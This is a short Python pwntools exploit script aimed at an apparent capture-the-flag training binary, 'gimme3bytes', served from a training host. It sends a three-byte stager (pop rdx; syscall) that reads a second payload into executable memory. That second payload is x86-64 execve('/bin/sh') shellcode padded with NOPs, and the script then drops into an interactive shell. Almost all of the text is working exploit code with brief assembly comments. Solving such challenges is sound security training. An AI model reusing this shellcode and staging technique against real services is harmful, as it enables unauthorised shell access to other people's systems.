from pwn import *
import binascii
# context.terminal = [ 'tmux', 'splitw' , '-h']
context.terminal = ['terminator', '--new-tab', '-x']
HOST = "training.jinblack.it"
PORT = 2004
PROG = "./gimme3bytes"
if args.REMOTE:
    r = remote(HOST, PORT)
elif args.GDB:
    r = process(PROG)
    gdb.attach(r,"""
    
    """)
    input("wait for gdb")
else:
    r = process(PROG)

r.recvuntil("\n>")

# pop rdx
# syscall
# We have everything ready to do a read inside the region we are going to execute into
payload = b'\x5A\x0F\x05'
input("send...")
r.send(payload)


# execve('/bin/sh')
# xor    rax,rax
# mov    rax,0x3b
# movabs rbx,0x68732f6e69622f
# push   rbx
# mov    rdi,rsp
# xor    rbx,rbx
# push   rbx
# mov    rsi,rsp
# mov    rdx,rsi
# syscall
payload = b"\x48\x31\xC0\x48\xC7\xC0\x3B\x00\x00\x00\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xF2\x0F\x05" 


input("send...")
r.send(payload.ljust(0xff, b"\x90"))

r.interactive()
